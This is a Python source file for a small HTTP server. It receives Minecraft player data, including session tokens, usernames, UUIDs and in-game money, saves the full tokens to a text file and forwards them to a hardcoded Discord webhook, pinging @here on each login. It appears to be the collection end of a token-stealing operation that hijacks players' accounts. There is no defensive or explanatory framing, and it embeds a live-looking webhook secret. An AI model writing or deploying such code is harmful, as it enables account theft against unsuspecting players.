from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import urllib.request
import urllib.error

DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1457853928082247785/sbu1wSV0HVvimlh0CZhvhRpnAoX90fj6eMfN2SUHw6Gfh2FsVulYaeM4A2Ely-quGs94"

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            length = int(self.headers['Content-Length'])
            data = json.loads(self.rfile.read(length).decode())
            
            # Get ALL fields with proper defaults
            username = data.get('username', 'Unknown').strip()
            uuid = data.get('uuid', '').strip()
            server = data.get('server', '').strip()
            token = data.get('token', '').strip()
            money = data.get('money', '0').strip()
            playtime = data.get('playtime', '0h').strip()
            kills = data.get('kills', '0').strip()
            deaths = data.get('deaths', '0').strip()
            skin = data.get('skin', '').strip()
            log_type = data.get('type', 'login').strip()
            
            print(f"Got: {username} on {server}")
            print(f"Token length: {len(token)} chars")
            
            # Save to file
            with open('tokens.txt', 'a') as f:
                # Save FULL token to file
                f.write(f"{username} | {uuid} | {server} | {token} | {money} | {playtime} | {kills} | {deaths}\n")
            
            # Send to Discord (like the Cloudflare worker)
            try:
                headers = {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0'
                }
                
                # Determine if it's a login
                is_login = log_type.lower() == "login"
                
                # Build description (like Cloudflare worker)
                description_parts = [
                    f"**Username:** `{username}`",
                    f"**UUID:** `{uuid}`",
                    f"**Server:** `{server}`"
                ]
                
                # Add optional stats if they exist and aren't just "0"
                if money and money != "0":
                    description_parts.append(f"**Money:** `{money}`")
                if playtime and playtime != "0h":
                    description_parts.append(f"**Playtime:** `{playtime}`")
                if kills and kills != "0":
                    description_parts.append(f"**Kills:** `{kills}`")
                if deaths and deaths != "0":
                    description_parts.append(f"**Deaths:** `{deaths}`")
                
                # Add token in spoiler if it's a login
                if is_login and token:
                    description_parts.append(f"\n🔑 **Session Token:**\n||`{token}`||")
                
                description = "\n".join(description_parts)
                
                # Create embed
                embed = {
                    "title": "✅ User Connected" if is_login else "❌ User Disconnected",
                    "color": 5763719 if is_login else 15548997,
                    "description": description
                }
                
                # Add skin/thumbnail if available
                if skin:
                    embed["thumbnail"] = {"url": skin}
                elif uuid:
                    embed["thumbnail"] = {"url": f"https://mc-heads.net/head/{uuid.replace('-', '')}"}
                
                # Build content message (like Cloudflare worker)
                content = None
                if is_login:
                    if money and money != "0":
                        content = f"@here Money: ||{money}||"
                    else:
                        content = "@here"
                
                # Create final payload
                payload = {
                    "content": content,
                    "embeds": [embed],
                    "allowed_mentions": {
                        "parse": ["everyone", "roles", "users"]
                    }
                }
                
                # Send to Discord
                req_data = json.dumps(payload).encode('utf-8')
                req = urllib.request.Request(DISCORD_WEBHOOK, data=req_data, headers=headers)
                response = urllib.request.urlopen(req, timeout=10)
                print(f"✅ Sent to Discord: Status {response.status}")
                
            except urllib.error.HTTPError as e:
                print(f"❌ Discord HTTP error: {e.code} - {e.reason}")
                # Read error response for debugging
                try:
                    error_body = e.read().decode('utf-8')
                    print(f"Error details: {error_body[:500]}")
                    
                    # If it's a 400 error, check if token is too long
                    if e.code == 400 and len(token) > 4000:
                        print("⚠️ Token might be too long for Discord")
                        # Try again without the token in the embed
                        embed["description"] = embed["description"].replace(f"\n🔑 **Session Token:**\n||`{token}`||", 
                                                                          "\n🔑 **Session Token:** *(too long for Discord, saved to file)*")
                        payload["embeds"] = [embed]
                        req_data = json.dumps(payload).encode('utf-8')
                        req = urllib.request.Request(DISCORD_WEBHOOK, data=req_data, headers=headers)
                        urllib.request.urlopen(req, timeout=10)
                        print("✅ Sent fallback message to Discord")
                except Exception as e2:
                    print(f"Failed to handle error: {e2}")
                    
            except Exception as e:
                print(f"❌ Discord error: {type(e).__name__}: {e}")
            
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')
            
        except json.JSONDecodeError as e:
            print(f"❌ JSON decode error: {e}")
            self.send_response(400)
            self.end_headers()
            self.wfile.write(b'Invalid JSON')
        except Exception as e:
            print(f"❌ Server error: {type(e).__name__}: {e}")
            import traceback
            traceback.print_exc()
            self.send_response(500)
            self.end_headers()
    
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Server running')
    
    def log_message(self, format, *args):
        # Suppress default HTTP logging
        pass

print("🚀 Server starting on port 5000")
server = HTTPServer(('0.0.0.0', 5000), Handler)
server.serve_forever()
